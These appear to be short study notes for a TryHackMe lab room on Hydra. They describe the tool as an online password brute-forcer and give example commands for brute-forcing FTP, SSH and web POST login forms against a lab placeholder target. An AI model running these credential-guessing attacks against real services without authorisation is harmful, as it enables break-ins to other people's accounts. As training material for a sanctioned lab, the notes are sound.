https://tryhackme.com/room/hydra

apt install hydra

Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.

Hydra can run through a list and “brute force” some authentication services. Imagine trying to manually guess someone’s password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.


- For example, if we wanted to brute force FTP with the username being user and a password list being passlist.txt, we’d use the following command:
$ hydra -l user -P passlist.txt ftp://MACHINE_IP


- SSH
$ hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

- Post Web Form
$ sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"

- Below is a more concrete example Hydra command to brute force a POST login form:
$ hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V


